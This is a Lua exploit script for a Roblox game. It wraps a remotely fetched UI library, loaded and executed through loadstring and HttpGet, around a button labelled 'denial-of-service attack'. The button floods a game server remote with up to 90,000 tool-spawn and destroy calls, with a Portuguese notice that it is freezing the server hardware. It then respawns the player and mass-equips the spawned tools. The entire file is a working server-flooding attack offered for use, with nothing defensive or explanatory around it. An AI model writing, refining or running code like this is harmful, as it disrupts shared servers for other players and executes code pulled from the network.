WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

Window = WindUI:CreateWindow({
    Title = "Cyber Invasion",
    SubTitle = "V one",
    Icon = "Computer",
    Size = UDim2.new(0, 580, 0, 440),
    Transparent = true,
    Theme = "Dark",
    BackgroundImage = "rbxassetid://14457936183",
    BackgroundTransparency = 0.85
})

local Tab = Window:Tab({
    Title = "Commandos",
    Icon = "terminal"
})

Tab:Input({
    Title = "Textbox to damaging a computer",
    Desc = "Sign the target computer's name here.",
    Placeholder = "Write Here the Player Target...",
    Callback = function(Value)
        _G.Target = Value
    end
})

Tab:Button({
   Name = "denial-of-service attack",
   Desc = "target: server",
   Callback = function()
local player = game:GetService("Players").LocalPlayer
        if not player then return end
        local replicatedStorage = game:GetService("ReplicatedStorage")

        local character = player.Character or player.CharacterAdded:Wait()
        local rootpart = character:WaitForChild("HumanoidRootPart", 10)
        if not rootpart then return end
        local oldcf = rootpart.CFrame

        local re = replicatedStorage:FindFirstChild("RE")
        local toolRemote = re and re:FindFirstChild("1Too1l")
        if not toolRemote then return end

        -- Notificação inicial de encerramento solicitada
        WindUI:Notify({ 
            Title = "C.I", 
            Content = "travando hardware do servidor...", 
            Duration = 5 
        })

        task.spawn(function()
            for m = 1, 90000 do
                task.spawn(function()
                    if toolRemote:IsA("RemoteFunction") then
                        toolRemote:InvokeServer("PickingTools", "FireHose")
                    else
                        toolRemote:FireServer("PickingTools", "FireHose")
                    end
                end)

                local backpack = player:FindFirstChild("Backpack")
                if backpack then
                    local fireHose = backpack:FindFirstChild("FireHose")
                    if fireHose and fireHose:FindFirstChild("ToolSound") then
                        fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                    end
                end
                if m % 15 == 0 then task.wait(0.1) end
            end
        end)

        task.wait(0.4)
        player.CharacterRemoving:Wait()
        local newCharacter = player.CharacterAdded:Wait()
        local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
        local humanoid = newCharacter:WaitForChild("Humanoid", 15)

        if newRootPart and humanoid then
            task.wait(0.7)
            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
            newRootPart.CFrame = oldcf
            newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        end

        task.wait(0.5)

        local backpack = player:WaitForChild("Backpack", 10)
        if backpack then
            local items = backpack:GetChildren()
            local equipCount = 0
            for i = 1, #items do
                local item = items[i]
                if item:IsA("Tool") and item.Name == "FireHose" then
                    equipCount = equipCount + 1
                    task.defer(function() item.Parent = newCharacter end)
                    if equipCount % 8 == 0 then task.wait(0.02) end 
                end
            end
        end
        task.wait(0.5)
    end
})

